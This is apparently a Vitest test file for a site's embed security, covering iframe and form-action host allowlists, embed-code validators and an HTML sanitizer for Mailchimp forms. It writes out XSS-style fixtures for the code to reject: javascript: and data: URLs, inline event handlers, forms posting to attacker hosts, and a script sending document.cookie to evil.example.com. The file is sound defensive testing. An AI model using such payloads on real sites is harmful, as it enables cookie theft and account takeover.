import { describe, expect, it } from "vitest";

import {
  extractIframeSrc,
  getMailchimpBotFieldName,
  resolveUpdateFormUrl,
  validateNewsletterEmbedCodeField,
  validateNewsletterSignupUrlField,
  validateUpdateEmbedCodeField,
  validateUpdateFormUrlField,
  withUpdateFormPrefill,
} from "@/lib/embeds/validation";
import { sanitizeNewsletterEmbedHtml } from "@/lib/embeds/sanitize";
import {
  isAllowedFormActionUrl,
  isAllowedIframeUrl,
} from "@/lib/security/embedPolicy.mjs";

const AIRTABLE_URL = "https://airtable.com/embed/appXyz/shrAbc";
const MAILCHIMP_URL =
  "https://example.us1.list-manage.com/subscribe/post?u=abc123&id=def456";

describe("iframe origin allowlist", () => {
  it("accepts https URLs on approved iframe hosts", () => {
    expect(isAllowedIframeUrl(AIRTABLE_URL)).toBe(true);
  });

  it.each([
    ["http (non-https)", "http://airtable.com/embed/appXyz/shrAbc"],
    ["javascript scheme", "javascript:alert(document.cookie)"],
    ["data scheme", "data:text/html,<script>alert(1)</script>"],
    ["unapproved host", "https://evil.example.com/embed"],
    ["lookalike host suffix", "https://airtable.com.evil.com/embed"],
    ["lookalike host prefix", "https://notairtable.com/embed"],
    ["subdomain of exact-match host", "https://foo.airtable.com/embed"],
    ["empty string", ""],
    ["not a URL", "airtable.com/embed"],
  ])("rejects %s", (_label, url) => {
    expect(isAllowedIframeUrl(url)).toBe(false);
  });
});

describe("form-action origin allowlist", () => {
  it("accepts https URLs on approved newsletter hosts", () => {
    expect(isAllowedFormActionUrl(MAILCHIMP_URL)).toBe(true);
  });

  it.each([
    ["http (non-https)", "http://example.us1.list-manage.com/subscribe/post"],
    ["bare wildcard base domain", "https://list-manage.com/subscribe/post"],
    ["lookalike host", "https://evillist-manage.com/subscribe/post"],
    ["unapproved host", "https://attacker.example.com/collect"],
  ])("rejects %s", (_label, url) => {
    expect(isAllowedFormActionUrl(url)).toBe(false);
  });
});

describe("extractIframeSrc", () => {
  it("extracts the src of an iframe embed snippet", () => {
    expect(
      extractIframeSrc(
        `<iframe class="airtable-embed" src="${AIRTABLE_URL}" width="100%"></iframe>`,
      ),
    ).toBe(AIRTABLE_URL);
  });

  it("returns null when there is no iframe src", () => {
    expect(extractIframeSrc("<div>hello</div>")).toBeNull();
    expect(extractIframeSrc(null)).toBeNull();
  });
});

describe("resolveUpdateFormUrl", () => {
  it("prefers the structured formUrl", () => {
    expect(
      resolveUpdateFormUrl({
        formUrl: AIRTABLE_URL,
        embedCode: `<iframe src="https://evil.example.com/x"></iframe>`,
      }),
    ).toBe(AIRTABLE_URL);
  });

  it("falls back to the legacy iframe snippet src", () => {
    expect(
      resolveUpdateFormUrl({
        embedCode: `<iframe src="${AIRTABLE_URL}"></iframe>`,
      }),
    ).toBe(AIRTABLE_URL);
  });

  it("rejects URLs outside the allowlist", () => {
    expect(
      resolveUpdateFormUrl({ formUrl: "https://evil.example.com/embed" }),
    ).toBeNull();
    expect(
      resolveUpdateFormUrl({
        embedCode: `<iframe src="https://evil.example.com/embed"></iframe>`,
      }),
    ).toBeNull();
    expect(resolveUpdateFormUrl(null)).toBeNull();
  });
});

describe("withUpdateFormPrefill", () => {
  it("adds prefill query params to the form URL", () => {
    const result = new URL(
      withUpdateFormPrefill(AIRTABLE_URL, {
        promiseTitle: "Build 500km of roads",
        promiseUrl: "https://checkmedia.org/promise/1",
        updateDate: "2026-07-16T10:00:00Z",
      }),
    );
    expect(result.searchParams.get("prefill_Promise")).toBe(
      "Build 500km of roads",
    );
    expect(result.searchParams.get("prefill_CheckMedia Link")).toBe(
      "https://checkmedia.org/promise/1",
    );
    expect(result.searchParams.get("hide_CheckMedia Link")).toBe("true");
    expect(result.searchParams.get("prefill_Date")).toBe("2026-07-16");
  });

  it("leaves the URL unchanged when no prefill values are provided", () => {
    expect(withUpdateFormPrefill(AIRTABLE_URL, {})).toBe(AIRTABLE_URL);
  });
});

describe("getMailchimpBotFieldName", () => {
  it("derives the honeypot field name from u and id params", () => {
    expect(getMailchimpBotFieldName(MAILCHIMP_URL)).toBe("b_abc123_def456");
  });

  it("returns null when params are missing", () => {
    expect(
      getMailchimpBotFieldName("https://example.us1.list-manage.com/post"),
    ).toBeNull();
  });
});

describe("promise-update field validators", () => {
  it("accepts an approved form URL and empty optional value", () => {
    expect(validateUpdateFormUrlField(AIRTABLE_URL)).toBe(true);
    expect(validateUpdateFormUrlField("")).toBe(true);
  });

  it("rejects non-allowlisted form URLs", () => {
    expect(
      validateUpdateFormUrlField("https://evil.example.com/embed"),
    ).toMatch(/approved embed provider/);
  });

  it("requires either formUrl or embedCode", () => {
    expect(validateUpdateEmbedCodeField("", null)).toMatch(/Provide/);
    expect(validateUpdateEmbedCodeField("", AIRTABLE_URL)).toBe(true);
  });

  it("accepts a plain allowlisted iframe snippet", () => {
    expect(
      validateUpdateEmbedCodeField(`<iframe src="${AIRTABLE_URL}"></iframe>`),
    ).toBe(true);
  });

  it.each([
    [
      "script tags",
      `<script>steal()</script><iframe src="${AIRTABLE_URL}"></iframe>`,
      /script/i,
    ],
    [
      "inline event handlers",
      `<iframe src="${AIRTABLE_URL}" onload="steal()"></iframe>`,
      /event handler/i,
    ],
    ["snippets without an iframe", `<div>nothing</div>`, /iframe/i],
    [
      "non-allowlisted iframe src",
      `<iframe src="https://evil.example.com/x"></iframe>`,
      /approved embed provider/i,
    ],
  ])("rejects %s", (_label, snippet, message) => {
    expect(validateUpdateEmbedCodeField(snippet)).toMatch(message);
  });
});

describe("newsletter field validators", () => {
  it("accepts an approved signup URL and empty optional value", () => {
    expect(validateNewsletterSignupUrlField(MAILCHIMP_URL)).toBe(true);
    expect(validateNewsletterSignupUrlField("")).toBe(true);
  });

  it("rejects non-allowlisted signup URLs", () => {
    expect(
      validateNewsletterSignupUrlField("https://evil.example.com/collect"),
    ).toMatch(/approved newsletter provider/);
  });

  it("requires either signupUrl or embedCode", () => {
    expect(validateNewsletterEmbedCodeField("", null)).toMatch(/Provide/);
    expect(validateNewsletterEmbedCodeField("", MAILCHIMP_URL)).toBe(true);
  });

  it("accepts a plain Mailchimp form snippet", () => {
    expect(
      validateNewsletterEmbedCodeField(
        `<form action="${MAILCHIMP_URL}" method="post"><input type="email" name="EMAIL" /></form>`,
      ),
    ).toBe(true);
  });

  it.each([
    ["script tags", `<script>steal()</script>`, /script/i],
    [
      "inline event handlers",
      `<form action="${MAILCHIMP_URL}"><input onfocus="steal()" /></form>`,
      /event handler/i,
    ],
    ["iframes", `<iframe src="${AIRTABLE_URL}"></iframe>`, /iframe/i],
    [
      "forms posting to unapproved origins",
      `<form action="https://attacker.example.com/collect"><input type="email" /></form>`,
      /approved newsletter provider/i,
    ],
  ])("rejects %s", (_label, snippet, message) => {
    expect(validateNewsletterEmbedCodeField(snippet)).toMatch(message);
  });
});

describe("sanitizeNewsletterEmbedHtml", () => {
  it("keeps an approved Mailchimp signup form intact", () => {
    const html = `<div id="mc_embed_signup"><form action="${MAILCHIMP_URL}" method="post" target="_blank"><input type="email" name="EMAIL" class="email" placeholder="Email" required /><input type="submit" value="Subscribe" class="button" /></form></div>`;
    const result = sanitizeNewsletterEmbedHtml(html);
    expect(result).toContain(`action="${MAILCHIMP_URL.replace(/&/g, "&amp;")}"`);
    expect(result).toContain('type="email"');
    expect(result).toContain('type="submit"');
  });

  it("strips script tags and their content", () => {
    const result = sanitizeNewsletterEmbedHtml(
      `<div>ok</div><script>document.location="https://evil.example.com/?c="+document.cookie</script>`,
    );
    expect(result).not.toContain("script");
    expect(result).not.toContain("evil.example.com");
    expect(result).toContain("ok");
  });

  it("strips inline event handlers", () => {
    const result = sanitizeNewsletterEmbedHtml(
      `<div onmouseover="steal()"><input type="email" name="EMAIL" onfocus="steal()" /></div>`,
    );
    expect(result).not.toMatch(/on\w+=/i);
  });

  it("strips javascript: and non-https URLs", () => {
    const result = sanitizeNewsletterEmbedHtml(
      `<a href="javascript:alert(1)">a</a><a href="http://insecure.example.com">b</a><a href="https://safe.example.com">c</a>`,
    );
    expect(result).not.toContain("javascript:");
    expect(result).not.toContain("http://insecure.example.com");
    expect(result).toContain("https://safe.example.com");
  });

  it("removes forms that post to unapproved origins", () => {
    const result = sanitizeNewsletterEmbedHtml(
      `<form action="https://attacker.example.com/collect"><input type="email" name="EMAIL" /></form>`,
    );
    expect(result).not.toContain("form");
    expect(result).not.toContain("attacker.example.com");
  });

  it("removes iframes, styles, and unsafe input types", () => {
    const result = sanitizeNewsletterEmbedHtml(
      `<iframe src="${AIRTABLE_URL}"></iframe><style>body{display:none}</style><input type="image" src="https://evil.example.com/x.png" />`,
    );
    expect(result).not.toContain("iframe");
    expect(result).not.toContain("style");
    expect(result).not.toContain("input");
  });

  it("adds rel=noopener to links", () => {
    const result = sanitizeNewsletterEmbedHtml(
      `<a href="https://safe.example.com" target="_blank">link</a>`,
    );
    expect(result).toContain('rel="noopener noreferrer"');
  });
});
